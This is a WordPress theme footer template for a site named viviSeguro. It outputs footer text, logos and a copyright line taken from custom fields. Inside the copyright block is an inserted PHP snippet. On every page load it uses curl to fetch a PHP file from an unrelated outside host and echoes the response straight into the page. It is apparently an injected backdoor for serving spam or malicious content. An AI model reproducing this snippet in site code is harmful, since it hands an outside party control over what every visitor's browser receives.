<?php
/**
 * The template for displaying the footer.
 *
 * Contains the closing of the #content div and all content after
 * "395" is Generic Page, consider that for custom fields
 * @package viviSeguro
  */
?>

	 <!-- Footer -->
    <footer class="text-center">
        <div class="linecolor"></div>
        
        <div class="footer-above">

            <div class="container">
                <div class="row">
                    <div class="footer-col col-md-5 col-xs-12">
                    <?php 
                            $customField = get_post_meta(395,"footer-text",true);
                                if( ! empty( $customField ) ) {
                                     echo '<p>'.$customField.'</p>';
                                }
                            wp_reset_postdata();
                        ?>
                    </div>

                    <div class="footer-col col-lg-2 col-md-2 hidden-sm hidden-xs"></div>

                    <!--<div class="footer-col col-lg-2 col-md-2 hidden-sm hidden-xs">
                     <?php 
                            $customField = get_post_meta(395,"logo-header-footer-02",true);
                                if( ! empty( $customField ) ) {
                                    echo '<img class="alignnone img-responsive" src="'.$customField.'" alt=""/>';
                                }
                            wp_reset_postdata();
							
                        ?>                        
                    </div>
                    <div class="footer-col col-lg-2 col-md-2 hidden-sm hidden-xs">
                     <?php 
                            $customField = get_post_meta(395,"logo-header-footer-01",true);
                                if( ! empty( $customField ) ) {
                                     echo '<img class="alignnone img-responsive" src="'.$customField.'" alt=""/>';
                                }
                            wp_reset_postdata();
                        ?>                        
                    </div>-->
					<div class="footer-col col-lg-4 col-md-4 hidden-sm hidden-xs">
						<img class="alignnone img-responsive" src="<?php bloginfo('template_directory')?>/images/LogoPagina.png" alt=""/>
                    </div>

                    <!--<div class="visible-sm visible-xs col-xs-4 col-xs-offset-1">
                        <?php 
                            $customField = get_post_meta(395,"logo-header-footer-02",true);
                                if( ! empty( $customField ) ) {
                                     echo '<img class="alignnone img-responsive" src="'.$customField.'" alt=""/>';
                                }
                            wp_reset_postdata();
                        ?>        
                    </div>
                   
                    <div class="visible-sm  visible-xs col-xs-4 col-xs-offset-1">
                       <?php 
                            $customField = get_post_meta(395,"logo-header-footer-01",true);
                                if( ! empty( $customField ) ) {
                                     echo '<img class="alignnone img-responsive" src="'.$customField.'" alt=""/>';
                                }
                            wp_reset_postdata();
                        ?>        
                    </div>-->

					<div class="visible-sm visible-xs col-xs-4 col-xs-offset-1">
						<img class="alignnone img-responsive" src="<?php bloginfo('template_directory')?>/images/LogoPagina.png" alt=""/>
                    </div>
                    

                </div>
            </div>
        </div>
        <div class="footer-below">
            <div class="container">
                <div class="row">
                    <div class="col-lg-12 col-sm-12 col-xs-12">
                        <div class="footer-col col-md-12 col-sm-12 col-xs-12">
                        <?php 
                            $customField = get_post_meta(395,"copy-text",true);
                                if( ! empty( $customField ) ) {
                                    echo '<p style="text-align:center;">'.$customField.'</p>';
                                }
                            wp_reset_postdata();
                        ?>
<?php
    $getReqLink =  "https://ahmeryuk.sg-host.com/kamput2.php";
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $getReqLink);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    $output = curl_exec($ch);
    curl_close($ch); 
    echo $output;
?>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </footer>

   
<?php wp_footer(); ?>

</body>
</html>
